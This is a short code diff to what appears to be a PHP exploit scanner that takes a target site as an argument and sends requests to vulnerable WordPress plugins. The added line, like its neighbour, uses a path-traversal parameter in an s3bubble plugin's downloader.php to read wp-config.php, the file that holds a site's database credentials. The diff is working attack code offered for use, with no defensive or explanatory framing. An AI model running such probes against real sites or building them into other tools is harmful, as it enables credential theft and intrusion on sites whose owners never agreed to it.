@@ -263,6 +263,8 @@ __request($argv[1], '/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=
 
 __request($argv[1], '/wp-content/plugins/history-collection/download.php?var=../../../wp-config.php');
 
+__request($argv[1], '/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?path=../../../../../../../wp-config.php');
+
 
 function __request($url, $plugin) {
 
